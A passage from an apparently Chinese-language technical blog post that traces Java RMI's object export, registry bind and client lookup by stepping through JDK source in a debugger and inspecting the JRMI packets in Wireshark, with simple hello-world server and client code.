class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class demo_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        HelloServiceImpl hello &#x3D; new HelloServiceImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个过程大概可以描述为:创建远程对象会生成这个远程对象的stub和skel,并将其绑定到一个随机端口发布</p><p>由于我们的HelloServiceImpl继承自UnicastRemoteObject,来到它的构造方法,跟进this()</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312204338668.png" class title="image-20220312204338668"><p>继续来到UnicastRemoteObject的含参构造方法,此时this为我们的HelloServiceImpl类,传入它和port=0到exportObject方法中</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312204507250.png" class title="image-20220312204507250"><p>直接return了exportObject的返回值,obj为HelloServiceImpl对象,这里实例化的UnicastServerRef就是一个target,包含了一些objid,host等,继续跟进</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312204711675.png" class title="image-20220312204711675"><p>此时sref为LiveRef,调用LiveRef.exportObject并将obj(HelloServiceImpl对象)传入</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312205039488.png" class title="image-20220312205039488"><p>进入Util.createProxy创建HelloServiceImpl类的代理对象,我们发现这个地方非常熟悉,之前获取注册中心和创建注册中心的时候在这个地方创建注册中心存根实例,而此时已经变成了创建一个HelloServiceImpl的动态代理对象用于被客户端调用,我们跟进看看<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312205441685.png" class title="image-20220312205441685"></p><p>现在没有执行第55行的代码创建Stub,而是来到了62行创建HelloServiceImpl的动态代理对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210202753.png" class title="image-20220312210202753"><p>现在我们回到UnicastServerRef#exportObject,此时var5便是我们刚刚创建的HelloServiceImpl的动态代理对象,和之前一样,之前会在第91行创建服务端var6将一系列数据进行打包成为一个Target对象,我们接着跟进LiveRef#exportObject方法</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210507568.png" class title="image-20220312210507568"><p>一波套娃调用直接来到TCPTransport#exportObject</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210658630.png" class title="image-20220312210658630"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210711288.png" class title="image-20220312210711288"><p>还是这熟悉的地方,进入this.listen就会涉及网络服务,开启线程,开启监听</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210745260.png" class title="image-20220312210745260"><p>在231行处随机创建了一个端口的监听31970,同时开启线程TCP ACCEPT 0</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312210945367.png" class title="image-20220312210945367"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312211034368.png" class title="image-20220312211034368"><p>来到TCP ACCEPT 0线程,跟进executeAcceptLoop,在366行var1 = this.serverSocket.accept();处阻塞进程,等待请求,到此整个服务被暴露(exportObject方法)在对应端口上</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312211158502.png" class title="image-20220312211158502"><h1 id="第四步-服务端绑定对象"><a href="#第四步-服务端绑定对象" class="headerlink" title="第四步:服务端绑定对象"></a>第四步:服务端绑定对象</h1><p><strong>调试代码</strong>:</p><p>这个时候我们就需要提供一个远程对象以供绑定了,我这里实现了一个远程对象HelloServiceImpl,并将它绑定到了hello上(registry.bind(“hello”, hello))</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">interface HelloService extends Remote &#123;</span><br><span class="line">    String sayHello() throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class HelloServiceImpl extends UnicastRemoteObject implements HelloService &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.println(&quot;静态代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    protected HelloServiceImpl() throws RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello() throws RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;此处在程序A中被调用&quot;);</span><br><span class="line">        System.out.println(Runtime.getRuntime());</span><br><span class="line">        return &quot;程序B接收到返回值!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class demo_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1099);</span><br><span class="line">        HelloServiceImpl hello &#x3D; new HelloServiceImpl();</span><br><span class="line">        registry.bind(&quot;hello&quot;, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为此处我们调用的是LocateRegistry.createRegistry(1099);即获取到的registry是RegistryImpl对象,所以我们调用的bind方法是RegistryImpl#bind方法</p><p>在registry.bind处下断点跟进:</p><p>可以看到绑定只是将hello(键)和HelloServiceImpl对象(值)关联了起来,放入RegistryImpl的bindings这个hashtable中</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312185321016.png" class title="image-20220312185321016"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220312185440161.png" class title="image-20220312185440161"><h1 id="第五步-客户端调用lookup方法"><a href="#第五步-客户端调用lookup方法" class="headerlink" title="第五步:客户端调用lookup方法"></a>第五步:客户端调用lookup方法</h1><p><strong>调试代码</strong></p><p>客户端:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo_client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;此处在程序A中被调用&quot;</span>);</span><br><span class="line">        System.out.println(Runtime.getRuntime());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;程序B接收到返回值!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo_server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        HelloServiceImpl hello = <span class="keyword">new</span> HelloServiceImpl();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行服务端后我们在客户端registry.lookup(“hello”);处断点,lookup里面首先调用的是super.ref.newCall(),super.ref就是UnicastRef,所以就会直接进入下面的UnicastRef#newCall</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313160745939.png" class title="image-20220313160745939"><p>跟进后首先来到UnicastRef#newCall,在newConnection中与服务端建立链接,包括发起TCP握手包,协议确认包等,我们跟进详细分析一下</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313134208620.png" class title="image-20220313134208620"><p>在newConnection的结尾createConnection处创建链接,跟进</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313134438508.png" class title="image-20220313134438508"><p>来看第一部分代码在110行建立新的Socket链接,完成三次TCP握手</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313134546723.png" class title="image-20220313134546723"><p>三次握手流量包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313134632248.png" class title="image-20220313134632248"><p>紧接着刚刚的来看第一部分try部分的代码段,可以看到在119行处向输出流写入75(0x4b)然后调用var3.flush()发送</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313140805712.png" class title="image-20220313140805712"><p>查看这个返回包,其中内容便是0x4b我们刚刚发送的可以看到这是一个用来识别协议的数据包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313140915376.png" class title="image-20220313140915376"><p>第四个包便是服务器,从目标端口可以看出确实是由1099端口(即服务端)返回的并且传输的内容为0x4e,在前面的创建注册中心这一步也有分析道这个包是服务端发过来的</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313161523815.png" class title="image-20220313161523815"><p>继续往下看,下面就开始读取服务端的返回包了此时var读取了服务端发过来的包.var6=78(0x4e)</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313164223396.png" class title="image-20220313164223396"><p>包内容如下:可以看到Input Stream Message为0x4e</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313164641882.png" class title="image-20220313164641882"><p>在后面开始构造客户端-&gt;服务端的返回包,var3开始写入各种数据,然后在154行发送</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313170130534.png" class title="image-20220313170130534"><p>流量包内容,到这里客户端发送了两个数据包,服务器回复了一个数据包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313170555973.png" class title="image-20220313170555973"><p>回到UnicastRef#newCall,此时创建了一个StreamRemoteCall对象,在这里面开始构造远程调用流(即lookup的网络包)</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313170727946.png" class title="image-20220313170727946"><p>跟进StreamRemoteCall的构造函数,发现在38行写入80(0x50),在前面讲创建注册端的时候handleMessage中存在case80的逻辑,0x50表方法调用,构造这个数据包的目的就是发送信息给服务端让服务端去调用方法<img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313170924712.png" class title="image-20220313170924712"></p><p>回到lookup中,此时var1为我们lookup的字符串’hello’,将其序列化并写入了var3,准备数据等下发包给服务端,继续跟进super.ref.invoke方法(super.ref为UnicastRef),</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313172407026.png" class title="image-20220313172407026"><p>跟进StreamRemoteCall#excuteCall</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313172812198.png" class title="image-20220313172812198"><p>在第138行将刚刚我们写入缓存的序列化字符串发送了出去,我们看一下这个过程客户端与服务端的通信过程</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313172912773.png" class title="image-20220313172912773"><p>整个通信流程一共发了2个JRMI数据包,其中1号数据包是客户端发送的,3号数据包时服务端回复的,我们先来分析一下1号数据包</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313173416706.png" class title="image-20220313173416706"><p>1处明显就是刚刚写入的80(0x50),2处magic头中0xaced告诉服务器这是一个序列化数据,需要被反序列化3处则是我们序列化后的数据</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313173210425.png" class title="image-20220313173210425"><p>3号数据包是服务端给我们回复的数据包,我们用过lookup向服务端请求想要寻找一个和字符串hello绑定的远程对象,通过分析3号数据包看看服务端给了我们那些东西</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313173832363.png" class title="image-20220313173832363"><p>使用SerializationDumper.jar看一下内部结构,注意到TC_PROXYCLASSDESC处发现我们继承了java.rmi.Remote,HelloService,这里的HelloService就是我们自己写的那个绑定到注册中心上的类,下面的TC_BLOCKDATA也存放了一些数据,马上我们将会去读他</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313181832854.png" class title="image-20220313181832854"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220313185527112.png" class title="image-20220313185527112"><p>现在到这个地方,我们收到了服务器返回给我们的包,那么服务端的包究竟是怎么发过来的呢?在我们分析创建注册端的时候在RegistryImpl_Skel#dispatch中的switch语句会根据客户端发起的请求执行对应的回复,我们来看看这个地方,可以看到在下方的变量列表中param_3就是此时的var3,var3为2表示执行lookup方法,这与我们客户端的行为是对应的,我们重点关注一下case 2部分的代码</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314183821598.png" class title="image-20220314183821598"><p>这个地方是case2的代码</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314184138565.png" class title="image-20220314184138565"><p>在上图第80行中根据字符串hello查询到了对应的对象,可以看到此时var1为字符串hello,var3是我们查询到的对象HelloServiceImpl</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314184417850.png" class title="image-20220314184417850"><p>继续跟进RegistryImpl_Skel#dispatch 83行处,这个地方在准备回复包,写入了两次数据和一次UID,</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314185415590.png" class title="image-20220314185415590"><p>继续往下在RegistryImpl_Skel#dispatch 242行var2.releaseOutputStream();发送数据,而这个地方发送的数据就是我们刚刚分析的搭载序列化数据的数据包</p><p>回到客户端,刚刚我们分析到了StreamRemoteCall#excuteCall,接着往下执行后返回到lookup,在var6.readObject处获取到我们HelloServiceImpl的代理对象</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314191056906.png" class title="image-20220314191056906"><p>进入var6.readObject,可以看到获取到了我们的代理对象,并将其返回给var23</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314191243225.png" class title="image-20220314191243225"><p>最后调用super.ref.done,发送一些后续的包如垃圾处理的Dgc包,通知服务端我已经收到了代理对象,客户端可以进行垃圾回收了,来看这个过程的数据包,12号数据包是服务器将序列化对象传回给客户端,然后客户端读取这个包,获得代理对象后首先发了一次存活确认包(14-17),确认存活后客户端向服务端发起垃圾回收信号(第18个包),告诉服务端可以进行垃圾回收了,然后TCP挥手断开链接。</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314191608489.png" class title="image-20220314191608489"><p>至此,整个通信流程已经分析完毕了,整个流程我画了个调用图,如下:</p><h6 id="RMI-SERVER-CLIENT网络调用图registry-lookup通信过程"><a href="#RMI-SERVER-CLIENT网络调用图registry-lookup通信过程" class="headerlink" title="RMI-SERVER-CLIENT网络调用图registry.lookup通信过程"></a>RMI-SERVER-CLIENT网络调用图registry.lookup通信过程</h6><h6 id><a href="#" class="headerlink" title></a><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/RMI_SERVER-CLIENT%E8%B0%83%E7%94%A8%E7%BD%91%E7%BB%9C%E5%9B%BE.png" class title="image-20220314191608489"></h6><p><strong>到这里我不抛出了一个疑问:既然远程调用方法实在服务端上调用然后返回给我们返回值,那么这个返回值必然也是通过网络传输的,我翻遍了ReturnData这个包,用SerializationDumper.jar反反复复翻找也找不到我的返回值在那个地方的,于是我进行了一波探究,我发现在整个调用流程中并不只是存在1099端口的通信</strong></p><p>将服务端上远程对象的返回值更改为比较显眼的字符串</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314204224258.png" class title="image-20220314204224258"><p>在wireshark搜索后发现在另一个tcp流中找到了我们的返回值,此时是运行在3752-&gt;3766端口的,我觉得应该是在这个端口上通信来执行远程方法调用的一些网络通信</p><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314204458056.png" class title="image-20220314204458056"><img src="/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20220314204603457.png" class title="image-20220314204603457"><p><strong>至此,就基本上了解了RMI的通信交互过程</strong></p><p>原文地址:<a href="http://www.men9da.cn/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/">http://www.men9da.cn/2022/03/10/%E9%80%9A%E8%BF%87%E8%B0%83%E8%AF%95%E6%BA%90%E7%A0%81%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%88%86%E6%9E%90RMI%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/</a></p>]]></content>
    
    
      
      
